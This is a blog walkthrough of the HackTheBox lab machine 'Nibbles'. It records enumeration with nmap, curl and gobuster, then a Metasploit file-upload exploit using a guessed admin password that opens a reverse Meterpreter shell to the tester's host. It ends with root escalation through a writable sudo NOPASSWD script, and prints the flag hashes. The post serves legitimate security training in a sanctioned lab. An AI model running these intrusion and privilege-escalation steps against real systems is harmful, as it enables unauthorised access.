---
layout: post
title: Hackthebox Nibbles Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-29/nibbles-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Nibbles".<br>

#### Complation
48th / 131 boxes<br>

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.75 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-29 09:43 EEST
Nmap scan report for 10.10.10.75
Host is up (0.039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.33 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
{% endhighlight %}

### 2. Getting User

We have only one port interesting which is 80 (HTTP) and sounds there is nothing here.
![placeholder](https://inar1.github.io/public/images/2019-09-29/2019-09-29-09-52-04.png)

By running curl, we can find an interesting comment on the webpage.
{% highlight shell %}
root@kali:~# curl -i http://10.10.10.75
HTTP/1.1 200 OK
Date: Sun, 29 Sep 2019 06:55:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
ETag: "5d-5616c3cf7fa77"
Accept-Ranges: bytes
Content-Length: 93
Vary: Accept-Encoding
Content-Type: text/html

<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
{% endhighlight %}

It said there is nothing interesting there. However, it is an interesting website.
![placeholder](https://inar1.github.io/public/images/2019-09-29/2019-09-29-09-57-44.png)

try to gobuster again.
In the "README", we can see that current version of this "Nibbleblog" is "v4.0.3".
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/09/29 10:20:13 Starting gobuster
===============================================================
/index.php (Status: 200)
/sitemap.php (Status: 200)
/content (Status: 301)
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/languages (Status: 301)
===============================================================
2019/09/29 10:50:00 Finished
===============================================================
{% endhighlight %}

Since we had juicy information "Nibbleblog v4.0.3", try to look for well-known exploit.<br>
{% highlight shell %}
root@kali:~# searchsploit nibble
------------------------------------------------------- ----------------------------------------
 Exploit Title                                         |  Path
                                                       | (/usr/share/exploitdb/)
------------------------------------------------------- ----------------------------------------
Nibbleblog 3 - Multiple SQL Injections                 | exploits/php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)  | exploits/php/remote/38489.rb
------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

Sounds there is a RCE with metasploit.<br>
However, we need a guessing to figure out what is the credential.<br>
This time, the username is same as default and password is the server name.
{% highlight shell %}
admin:nibbles
{% endhighlight %}

Then, try to execute RCE with following procedure.
{% highlight shell %}
msf5 > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


msf5 > use exploit/multi/http/nibbleblog_file_upload

msf5 exploit(multi/http/nibbleblog_file_upload) > set rhost 10.10.10.75
rhost => 10.10.10.75

msf5 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin

msf5 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles

msf5 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog
targeturi => /nibbleblog

msf5 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.30:4444
[*] Sending stage (38247 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.10.10.75:37036) at 2019-09-29 11:25:40 +0300
[+] Deleted image.php

meterpreter > getuid
Server username: nibbler (1001)
{% endhighlight %}

Now we got a meterpreter shell.<br>
user.txt is in the directory "/home/nibbler".
{% highlight shell %}
meterpreter > ls
Listing: /home/nibbler
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2017-12-29 12:29:56 +0200  .bash_history
40775/rwxrwxr-x   4096  dir   2017-12-11 05:04:04 +0200  .nano
100400/r--------  1855  fil   2017-12-11 05:07:21 +0200  personal.zip
100400/r--------  33    fil   2017-12-11 05:35:21 +0200  user.txt

meterpreter > cat user.txt
b02ff32bb332deba49eeaed21152c8d8
{% endhighlight %}

### 3. Getting Root

Currently, we have a meterpreter shell.<br>
To do more enumeration, obtain a full shell like following.
{% highlight shell %}
meterpreter > shell
Process 1716 created.
Channel 1 created.

which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/home/nibbler$
{% endhighlight %}

By the command "sudo -l", we can find that nibbler can run "/home/nibbler/personal/stuff/monitor.sh" as sudo with no password.
{% highlight shell %}
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l

sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
{% endhighlight %}

Then, create the file "/home/nibbler/personal/stuff/monitor.sh" with content to spawn root shell.
{% highlight shell %}
nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff/
mkdir -p /home/nibbler/personal/stuff/
{% endhighlight %}
{% highlight shell %}
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "sudo su" > monitor.sh
echo "sudo su" > monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
chmod +x monitor.sh
{% endhighlight %}

Finally, execute the "monitor.sh". It takes time a bit but we can ahieve a root shell.
{% highlight shell %}
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh

sudo: unable to resolve host Nibbles: Connection timed out
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# id
id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

root.txt is in the directory "/root".
{% highlight shell %}
root@Nibbles:~# cat root.txt
cat root.txt
b6d745c0dfb6457c55591efc898ef88c
{% endhighlight %}
